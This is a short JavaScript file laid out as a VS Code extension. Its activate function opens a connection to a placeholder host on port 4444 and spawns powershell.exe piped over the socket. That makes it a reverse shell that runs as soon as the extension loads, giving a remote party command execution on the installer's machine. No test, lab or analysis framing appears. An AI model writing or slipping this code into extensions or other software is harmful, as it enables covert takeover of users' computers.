const { exec } = require('child_process');                                                                                                                                                                                                 
const net = require('net');                                                                                                                                                                                                                
                                                                                                                                                                                                                                           
function activate(context) {                                                                                                                                                                                                               
  const HOST = 'IP';                                                                                                                                                                                                             
  const PORT = 4444;                                                                                                                                                                                                                       

  const client = new net.Socket();
  client.connect(PORT, HOST, () => {
    const { spawn } = require('child_process');
    const sh = spawn('powershell.exe', []);

    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);

    sh.on('close', () => client.destroy());
  });
}

function deactivate() {}
module.exports = { activate, deactivate };
